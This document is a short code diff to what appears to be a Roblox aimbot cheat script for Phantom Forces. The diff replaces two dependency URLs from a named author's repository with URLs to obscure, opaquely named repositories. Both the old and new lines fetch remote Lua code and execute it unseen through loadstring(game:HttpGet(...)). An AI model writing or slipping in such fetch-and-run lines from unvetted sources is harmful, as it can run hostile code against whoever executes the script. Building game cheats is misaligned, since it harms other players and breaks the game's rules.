@@ -5,8 +5,8 @@
 ]]
 
 -- // Dependencies
-local Aiming = loadstring(game:HttpGet("https://raw.githubusercontent.com/Stefanuk12/Aiming/main/Module.lua"))()
-local ClientManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/Stefanuk12/ROBLOX/master/Games/Phantom%20Forces/ClientManager.lua"))()
+local Aiming = loadstring(game:HttpGet("https://raw.githubusercontent.com/libaan151/xxs/main/xxs1"))()
+local ClientManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/libaan151/xs42/main/xxxxxxxxxxwts0"))()
 
 -- //
 local AimingSettings = Aiming.Settings
